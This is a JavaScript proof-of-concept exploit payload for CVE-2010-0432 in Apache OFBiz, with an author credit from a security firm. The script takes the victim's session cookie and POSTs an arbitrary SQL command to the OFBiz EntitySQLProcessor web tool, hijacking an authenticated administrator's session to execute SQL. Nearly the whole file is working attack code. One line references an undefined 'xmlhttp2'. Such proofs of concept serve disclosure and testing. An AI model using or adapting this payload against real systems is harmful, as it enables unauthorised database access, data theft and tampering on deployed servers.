/*
 
Apache OFBiz SQL Remote Execution PoC Payload.
 
CVE: CVE-2010-0432
 
By: Lucas Apa ( lucas -at- bonsai-sec.com ).
 
Bonsai Information Security
 
http://www.bonsai-sec.com/
 
*/
 
var cmd = 'command';
 
var xmlhttp=false;
try {
xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
} catch (e) {
try {
xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
} catch (E) {
xmlhttp = false;
}
}
 
if (!xmlhttp && typeof XMLHttpRequest!='undefined') {
try {
xmlhttp = new XMLHttpRequest();
} catch (e) {
xmlhttp=false;
}
}
if (!xmlhttp && window.createRequest) {
try {
xmlhttp = window.createRequest();
} catch (e) {
xmlhttp=false;
}
}
 
xmlhttp.open("POST", "
https://www.example.com:8443/webtools/control/EntitySQLProcessor",true);
xmlhttp.onreadystatechange=function() {
if (xmlhttp2.readyState==4) {
//alert(xmlhttp.responseText)
}
}
 
var cookie = unescape(document.cookie);
xmlhttp.setRequestHeader("content-type",
"application/x-www-form-urlencoded");
xmlhttp.setRequestHeader("cookie", cookie);
var str1 = (<r><![CDATA[submitButton=Enviar&sqlCommand=]]></r>).toString();
var str2 = (<r><![CDATA[&group=org.ofbiz&rowLimit=200]]></r>).toString();
var post_data = str1+cmd+str2;
xmlhttp.send(post_data);